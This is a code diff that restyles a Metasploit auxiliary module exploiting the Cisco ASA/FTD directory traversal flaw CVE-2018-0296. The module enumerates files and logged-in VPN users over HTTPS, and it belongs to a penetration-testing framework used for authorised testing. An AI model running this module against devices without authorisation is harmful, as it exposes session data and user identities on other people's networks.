@@ -8,53 +8,58 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Cisco ASA Directory Traversal',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in Cisco's Adaptive Security Appliance (ASA) software and Firepower Threat Defense (FTD) software.
-        It lists the contents of Cisco's VPN web service which includes directories, files, and currently logged in users.
-      },
-      'Author'         => [ 'Michał Bentkowski',  # Discovery
-                            'Yassine Aboukir',    # PoC
-                            'Shelby Pace'         # Metasploit Module
-                          ],
-      'License'        => MSF_LICENSE,
-      'References'     => [
-                           [ 'CVE', '2018-0296' ],
-                           [ 'EDB', '44956' ]
-                          ],
-      'DisclosureDate' => '2018-06-06'
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Cisco ASA Directory Traversal',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in Cisco's Adaptive Security Appliance (ASA) software and Firepower Threat Defense (FTD) software.
+          It lists the contents of Cisco's VPN web service which includes directories, files, and currently logged in users.
+        },
+        'Author' => [
+          'Michał Bentkowski', # Discovery
+          'Yassine Aboukir',    # PoC
+          'Shelby Pace'         # Metasploit Module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2018-0296' ],
+          [ 'EDB', '44956' ]
+        ],
+        'DisclosureDate' => '2018-06-06'
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'Path to Cisco installation', '/' ]),
         OptBool.new('SSL', [ true, 'Use SSL', true ]),
         Opt::RPORT(443)
-      ])
+      ]
+    )
   end
 
   def is_accessible?
     uri = normalize_uri(target_uri.path, '+CSCOE+/logon.html')
 
     res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  uri
+      'method' => 'GET',
+      'uri' => uri
     )
 
-    return (res && (res.body.include?("SSL VPN Service") || res.body.include?("+CSCOE+") || res.body.include?("+webvpn+") || res.body.include?("webvpnlogin")))
+    return res && (res.body.include?('SSL VPN Service') || res.body.include?('+CSCOE+') || res.body.include?('+webvpn+') || res.body.include?('webvpnlogin'))
   end
 
   def list_files(path)
     uri = normalize_uri(target_uri.path, path)
 
     list_res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  uri
+      'method' => 'GET',
+      'uri' => uri
     )
 
     if list_res && list_res.code == 200
-      if list_res.body.match(/\/{3}sessions/)
+      if list_res.body.match(%r{/{3}sessions})
         get_sessions(list_res.body)
       else
         print_good(list_res.body)
@@ -66,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
     session_nos = response.scan(/([0-9]{2,})/)
 
     if session_nos.empty?
-      print_status("Could not detect any sessions")
+      print_status('Could not detect any sessions')
       print("\n")
       return
     end
@@ -81,8 +86,8 @@ class MetasploitModule < Msf::Auxiliary
 
     sessions.each do |session_no|
       users_res = send_request_cgi(
-        'method'  =>  'GET',
-        'uri'     =>  normalize_uri(target_uri.path, sessions_uri, session_no)
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, sessions_uri, session_no)
       )
 
       if users_res && users_res.body.include?('name')
@@ -97,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_status("There are no users logged in currently")
+    print_status('There are no users logged in currently')
   end
 
   def run
